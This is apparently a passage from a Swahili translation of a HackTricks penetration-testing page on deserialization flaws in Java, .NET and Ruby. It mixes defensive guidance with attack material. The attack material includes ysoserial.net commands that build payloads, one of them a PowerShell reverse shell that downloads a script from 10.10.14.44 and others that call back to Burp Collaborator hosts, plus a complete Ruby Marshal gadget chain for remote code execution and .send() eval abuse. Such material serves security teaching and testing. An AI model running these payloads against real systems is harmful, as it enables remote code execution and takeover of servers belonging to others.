* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Kwa Nini

Java hutumia uhuishaji kwa madhumuni mbalimbali kama vile:

* **Maombi ya HTTP**: Uhuishaji unatumika sana katika usimamizi wa vigezo, ViewState, vidakuzi, n.k.
* **RMI (Remote Method Invocation)**: Itifaki ya Java RMI, ambayo inategemea kabisa uhuishaji, ni msingi wa mawasiliano ya mbali katika maombi ya Java.
* **RMI juu ya HTTP**: Njia hii hutumiwa kawaida na maombi ya wavuti ya mteja tajiri wa Java, kutumia uhuishaji kwa mawasiliano yote ya vitu.
* **JMX (Java Management Extensions)**: JMX hutumia uhuishaji kwa kutuma vitu kupitia mtandao.
* **Itifaki za Desturi**: Katika Java, mazoezi ya kawaida ni kutuma vitu vya Java moja kwa moja, ambavyo vitadhihirishwa katika mifano ya kutumia udhaifu inayokuja.

### Kuzuia

#### Vitu vya Muda

Darasa linalotekeleza `Serializable` linaweza kutekeleza kama `transient` kwa kila kitu ndani ya darasa ambacho hakitakiwi kuwa uhuishaji. Kwa mfano:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Epuka Ufisadi wa darasa ambalo linahitaji kutekeleza Serializable

Katika hali ambapo **vitu fulani lazima viwekeleze `Serializable`** kwa sababu ya muundo wa darasa, kuna hatari ya kufanyika kwa ufisadi usiokusudiwa. Ili kuzuia hili, hakikisha vitu hivi havitaweza kufanyiwa ufasidi kwa kufafanua njia ya `final` ya `readObject()` ambayo kila mara itatoa kosa, kama inavyoonyeshwa hapa chini:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Kuboresha Usalama wa Deserialization katika Java**

Kuzoeza `java.io.ObjectInputStream` ni njia ya vitendo ya kuboresha mchakato wa deserialization. Njia hii ni sahihi wakati:

* Msimbo wa deserialization uko chini ya udhibiti wako.
* Madarasa yanayotarajiwa kwa deserialization yanajulikana.

Badilisha **`resolveClass()`** mbinu ili kuzuia deserialization kwa madarasa yanayoruhusiwa pekee. Hii inazuia deserialization ya darasa lolote isipokuwa yale yaliyoruhusiwa kwa uwazi, kama katika mfano ufuatao ambao unazuia deserialization kwa darasa la `Bicycle` pekee:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Kutumia Java Agent kwa Kuboresha Usalama** hutoa suluhisho la kurudi nyuma wakati marekebisho ya nambari hayawezekani. Njia hii inatumika hasa kwa **kupiga marufuku darasa zenye madhara**, kwa kutumia parameter ya JVM:
```
-javaagent:name-of-agent.jar
```
Inatoa njia ya kuhakikisha deserialization kwa njia ya kudumu, bora kwa mazingira ambapo mabadiliko ya mara moja ya nambari ni ngumu kutekeleza.

Angalia mfano katika [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Kutekeleza Vichungi vya Serialization**: Java 9 iliingiza vichungi vya serialization kupitia kiolesura cha **`ObjectInputFilter`**, ikitoa mfumo wenye nguvu wa kueleza vigezo ambavyo vitu vilivyosanidishwa lazima vikidhi kabla ya kudeserilishwa. Vichungi hivi vinaweza kutumika kwa kiwango kikubwa au kwa kila mtiririko, kutoa udhibiti wa kina juu ya mchakato wa deserialization.

Ili kutumia vichungi vya serialization, unaweza kuweka kichungi cha jumla kinachotumika kwa shughuli zote za deserialization au kukisakinisha kwa njia ya kudumu kwa mtiririko maalum. Kwa mfano:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Kutumia Maktaba za Nje kwa Usalama Ulioboreshwa**: Maktaba kama **NotSoSerial**, **jdeserialize**, na **Kryo** hutoa vipengele vya juu kwa udhibiti na ufuatiliaji wa deserialization ya Java. Maktaba hizi zinaweza kutoa safu za ziada za usalama, kama vile kuweka safu nyeupe au nyeusi ya madarasa, kuchambua vitu vilivyoseriwa kabla ya deserialization, na kutekeleza mikakati ya desturi ya serialization.

* **NotSoSerial** inazuia mchakato wa deserialization kuzuia utekelezaji wa nambari isiyotegemewa.
* **jdeserialize** inaruhusu uchambuzi wa vitu vilivyoseriwa vya Java bila kuvifanyia deserialization, kusaidia kutambua yaliyomo yanayoweza kuwa na nia mbaya.
* **Kryo** ni mfumo mbadala wa serialization unaozingatia kasi na ufanisi, ukitoa mikakati inayoweza kusanidiwa ya serialization inayoweza kuboresha usalama.

### Marejeo

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Mada kuhusu Deserialization na ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Mada kuhusu gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) na slaidi: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Karatasi ya Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Karatasi ya Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Uingizaji wa JNDI & log4Shell

Pata maelezo kuhusu **Uingizaji wa JNDI, jinsi ya kutumia vibaya kupitia RMI, CORBA & LDAP na jinsi ya kutumia log4shell** (na mfano wa kasoro hii) kwenye ukurasa ufuatao:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Huduma ya Ujumbe ya Java

> **Java Message Service** (**JMS**) API ni API ya Java ya kati ya ujumbe kwa kutuma ujumbe kati ya wateja wawili au zaidi. Ni utekelezaji wa kutatua tatizo la mtengenezaji-mteja. JMS ni sehemu ya Jukwaa la Java, Toleo la Biashara (Java EE), na ilidefiniwa na maelezo yaliyotengenezwa na Sun Microsystems, lakini ambayo tangu wakati huo imeongozwa na Mchakato wa Jumuiya ya Java. Ni kiwango cha ujumbe kinachoruhusu vipengele vya programu zinazotegemea Java EE kuunda, kutuma, kupokea, na kusoma ujumbe. Inaruhusu mawasiliano kati ya vipengele tofauti vya programu iliyosambazwa kuwa huru, ya kuaminika, na ya kiasinkroni. (Kutoka [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Bidhaa

Kuna bidhaa kadhaa zinazotumia hii kati ya ujumbe kutuma ujumbe:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Utekaji

Kwa hiyo, kimsingi kuna **huduma nyingi zinazotumia JMS kwa njia hatari**. Kwa hivyo, ikiwa una **mamlaka za kutosha** kutuma ujumbe kwa huduma hizi (kawaida utahitaji anwani halali) unaweza kuweza kutuma **vitengo vilivyoseriwa vibaya ambavyo vitadeserialized na mtumiaji/anayesubiri**.\
Hii inamaanisha kwamba katika utekaji huu **wateja wote wanaotumia ujumbe huo wataambukizwa**.

Kumbuka kwamba hata ikiwa huduma ni dhaifu (kwa sababu inadeserialize kuingia kwa mtumiaji kwa njia isiyofaa) bado unahitaji kutafuta vitu vya kuchezea halali ili kutumia kasoro.

Zana [JMET](https://github.com/matthiaskaiser/jmet) iliumbwa kwa **kuunganisha na kushambulia huduma hizi kwa kutuma vitengo vingi vilivyoseriwa kwa kutumia vitu vya kuchezea vilivyofahamika**. Mashambulizi haya yatafanya kazi ikiwa huduma bado ni dhaifu na ikiwa kifaa chochote kilichotumiwa kipo ndani ya programu dhaifu.

### Marejeo

* Mada ya JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slaidi: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

Katika muktadha wa .Net, kasoro za deserialization hufanya kazi kwa njia inayofanana na zile zilizopatikana katika Java, ambapo vitengo vinafanyiwa shambulio ili kukimbia nambari maalum wakati wa deserialization ya kitu.
### Alama ya Kidole

#### WhiteBox

Msimbo wa chanzo unapaswa kukaguliwa kwa matukio ya:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Makini inapaswa kuwa kwenye wachambuzi wa data ambao ruhusu aina kutambuliwa na kivinjari chini ya udhibiti wa mtumiaji.

#### BlackBox

Utafutaji unapaswa kulenga kwenye mfuatano wa herufi ulioandikwa kwa Base64 **AAEAAAD/////** au mfano wowote unaoweza kupitia deserialization upande wa seva, ukiruhusu udhibiti juu ya aina ya kudeserialize. Hii inaweza kujumuisha, lakini sio mdogo kwa, miundo ya **JSON** au **XML** inayojumuisha `TypeObject` au `$type`.

### ysoserial.net

Katika kesi hii unaweza kutumia zana [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) ili **kuunda mbinu za deserialization**. Mara baada ya kupakua hazina ya git unapaswa **kukusanya zana** kwa kutumia Visual Studio kwa mfano.

Ikiwa unataka kujifunza kuhusu **jinsi ysoserial.net inavyounda mbinu zake za kudanganya** unaweza [**kucheki ukurasa huu ambapo inaelezwa kifaa cha ObjectDataProvider + ExpandedWrapper + mfumo wa Json.Net**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Chaguo kuu za **ysoserial.net** ni: **`--gadget`**, **`--formatter`**, **`--output`** na **`--plugin`.**

* **`--gadget`** hutumiwa kuonyesha kifaa cha kutumia (onyesha darasa/funguo litakalotumiwa wakati wa deserialization kutekeleza amri).
* **`--formatter`**, hutumiwa kuonyesha njia ya kuhifadhi mbinu ya kudanganya (unahitaji kujua ni maktaba gani inayotumiwa nyuma ya pazia kudeserialize mzigo na kutumia hiyo hiyo kuihifadhi)
* **`--output`** hutumiwa kuonyesha ikiwa unataka mbinu ya kudanganya iwe katika muundo wa **raw** au imeandikwa kwa Base64. _Tambua kwamba **ysoserial.net** ita **andika** mzigo kwa kutumia **UTF-16LE** (kodishaji inayotumiwa kwa chaguo-msingi kwenye Windows) kwa hivyo ikiwa unapata raw na tuandike kutoka kwa konsoli ya linux unaweza kupata baadhi ya matatizo ya **utangamano wa uandishi** ambayo itazuia mbinu ya kufanya kazi ipasavyo (kwenye sanduku la HTB JSON mzigo ulifanya kazi katika UTF-16LE na ASCII lakini hii haimaanishi itafanya kazi kila wakati)._
* **`--plugin`** ysoserial.net inasaidia programu-jalizi za kutengeneza **mbinu za kudanganya kwa mifumo maalum** kama ViewState

#### Vigezo zaidi vya ysoserial.net

* `--minify` itatoa mzigo **mdogo** (ikiwezekana)
* `--raf -f Json.Net -c "chochote"` Hii itaonyesha vifaa vyote vinavyoweza kutumiwa na mfumo wa kuhifadhi uliopewa (`Json.Net` katika kesi hii)
* `--sf xml` unaweza **kuonyesha kifaa** (`-g`)na ysoserial.net itatafuta wachambuzi wa data wanaoendelea "xml" (bila kujali herufi kubwa au ndogo)

**Mifano ya ysoserial** ya kuunda mbinu za kudanganya:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** pia ina **parameter ya kuvutia sana** ambayo husaidia kuelewa vizuri jinsi kila shambulio linavyofanya kazi: `--test`\
Ikiwa unaashiria parameter hii, **ysoserial.net** ita **jaribu** shambulio **kwa kifaa chako,** ili uweze kujaribu kama mzigo wako utafanya kazi ipasavyo.\
Parameter hii ni ya manufaa kwa sababu ukirejea nambari utapata vipande vya nambari kama hii ifuatayo (kutoka [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Hii inamaanisha kwamba ili kufanya majaribio ya kutumia mwanya huo, msimbo utaita [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
Katika **mifano iliyopita ni dhaifu kwa shambulio lililoundwa**. Kwa hivyo ikiwa unapata kitu kama hicho katika maombi ya .Net inamaanisha labda maombi hayo pia ni dhaifu.\
Kwa hivyo **parameter ya `--test`** inaruhusu kuelewa **vipande vipi vya nambari ni dhaifu** kwa shambulio la deserialization ambalo **ysoserial.net** inaweza kuunda.

### ViewState

Tazama [POST hii kuhusu **jinsi ya jaribu kutumia parameter ya \_\_ViewState ya .Net**](exploiting-\_\_viewstate-parameter.md) kutekeleza **nambari ya kupindukia**. Ikiwa **tayari unajua siri** zilizotumiwa na mashine ya mwathiriwa, [**soma chapisho hili kujua jinsi ya kutekeleza nambari**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Kuzuia

Ili kupunguza hatari zinazohusiana na deserialization katika .Net:

* **Epuka kuruhusu mtiririko wa data kufafanua aina zao za vitu.** Tumia `DataContractSerializer` au `XmlSerializer` ikiwezekana.
* **Kwa `JSON.Net`, weka `TypeNameHandling` kuwa `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Epuka kutumia `JavaScriptSerializer` na `JavaScriptTypeResolver`.**
* **Punguza aina zinazoweza kudeserializwa**, ukiwa na ufahamu wa hatari zilizojumuishwa na aina za .Net, kama vile `System.IO.FileInfo`, ambayo inaweza kurekebisha mali za faili za seva, ikisababisha mashambulizi ya kukataa huduma.
* **Kuwa mwangalifu na aina zenye mali zenye hatari**, kama `System.ComponentModel.DataAnnotations.ValidationException` na mali yake ya `Value`, ambayo inaweza kutumiwa vibaya.
* **Kudhibiti kwa usalama uanzishaji wa aina** ili kuzuia wachawi kuingilia mchakato wa deserialization, hata `DataContractSerializer` au `XmlSerializer` inaweza kuwa dhaifu.
* **Tumia udhibiti wa orodha nyeupe** kwa kutumia `SerializationBinder` ya desturi kwa `BinaryFormatter` na `JSON.Net`.
* **Baki na habari kuhusu vifaa vya deserialization visivyo salama vilivyofahamika** ndani ya .Net na hakikisha deserializers hawazindui aina kama hizo.
* **Tenganisha nambari zenye hatari** kutoka kwa nambari yenye ufikiaji wa mtandao ili kuepuka kufunua vifaa vilivyofahamika, kama vile `System.Windows.Data.ObjectDataProvider` katika maombi ya WPF, kwa vyanzo vya data ambavyo haviaminiki.

### **Marejeo**

* Karatasi ya deserialization ya JSON ya Java na .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** mazungumzo: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) na slaidi: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Katika Ruby, uhuishaji unaruhusiwa na njia mbili ndani ya maktaba ya **marshal**. Njia ya kwanza, inayoitwa **dump**, hutumiwa kubadilisha kitu kuwa mtiririko wa byte. Mchakato huu huitwa uhuishaji. Kinyume chake, njia ya pili, **load**, hutumiwa kurejesha mtiririko wa byte kuwa kitu, mchakato unaoitwa deserialization.

Kwa kuhakikisha vitu vilivyohuishwa, **Ruby hutumia HMAC (Hash-Based Message Authentication Code)**, ikidhibitisha uadilifu na uhalali wa data. Kichwa kinachotumiwa kwa kusudi hili kimehifadhiwa katika moja ya maeneo kadhaa yanayowezekana:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Mnyororo wa vifaa vya deserialization ya jumla ya Ruby 2.X hadi RCE (maelezo zaidi katika** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
RCE nyingine ya kutumia Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() method

Kama ilivyoelezwa katika [**ripoti hii ya udhaifu**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), ikiwa baadhi ya data isiyo salama ya mtumiaji inafikia `.send()` method ya kitu cha ruby, method hii inaruhusu **kuita method nyingine** ya kitu na paramita yoyote.

Kwa mfano, kuita eval na kisha code ya ruby kama paramita ya pili itaruhusu kutekeleza code ya kiholela:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Zaidi ya hayo, ikiwa tu moja kati ya paramita ya **`.send()`** inadhibitiwa na mshambuliaji, kama ilivyotajwa katika andiko lililopita, inawezekana kuita njia yoyote ya kitu ambayo **haipaswi kupokea hoja** au ambayo hoja zake zina **thamani za msingi**.\
Kwa hili, inawezekana kuchunguza njia zote za kitu ili **kupata njia zenye kuvutia ambazo zinakidhi mahitaji hayo**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
